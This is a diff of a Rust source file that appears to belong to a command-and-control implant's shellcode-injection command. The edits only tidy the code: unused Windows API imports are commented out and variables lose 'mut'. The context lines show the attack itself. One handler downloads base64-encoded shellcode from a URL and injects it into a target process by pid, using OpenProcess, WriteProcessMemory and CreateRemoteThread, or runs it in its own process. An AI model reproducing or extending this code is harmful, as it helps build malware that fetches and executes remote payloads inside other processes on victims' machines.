@@ -8,7 +8,7 @@ use crate::cmd::{CommandArgs, command_out};
 #[cfg(windows)] use windows::Win32:: {
     Foundation::{
         CloseHandle,
-        GetLastError,
+        // GetLastError,
         BOOL, 
     },
     System::{
@@ -27,12 +27,12 @@ use crate::cmd::{CommandArgs, command_out};
             OpenProcess,
             CreateThread,
             CreateRemoteThread,
-            WaitForSingleObject,
+            // WaitForSingleObject,
             THREAD_CREATION_FLAGS,
             PROCESS_ALL_ACCESS
         },
         Diagnostics::Debug::WriteProcessMemory,
-        WindowsProgramming::INFINITE
+        // WindowsProgramming::INFINITE
     },
 };
 #[cfg(windows)] use std::ptr;
@@ -155,8 +155,8 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
         // Set up our variables; each one could fail on us.
         // Yes this is a lot of verbose error checking, but this
         // has to be rock solid or the agent will die.
-        let mut url: String;
-        let mut b64_iterations: u32;
+        let url: String;
+        let b64_iterations: u32;
 
         // Get URL
         match cmd_args.nth(0) {
@@ -184,12 +184,12 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
         match inject_type.as_str() {
             "remote" => {
                 // Get shellcode
-                let mut shellcode: Vec<u8>; 
+                let shellcode: Vec<u8>; 
                 match get_shellcode(url, b64_iterations, logger).await {
                     Ok(s) => { shellcode = s},
                     Err(e) => { return Ok(e.to_string()); }
                 };
-                let mut pid: u32;
+                let pid: u32;
                 // Get pid
                 match cmd_args.nth(0) {
                     Some(ps) => {
@@ -222,7 +222,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
             },
             "self"  => {
                 // Get shellcode
-                let mut shellcode: Vec<u8>; 
+                let shellcode: Vec<u8>; 
                 match get_shellcode(url, b64_iterations, logger).await {
                     Ok(s) => { shellcode = s},
                     Err(e) => { return Ok(e.to_string()) }
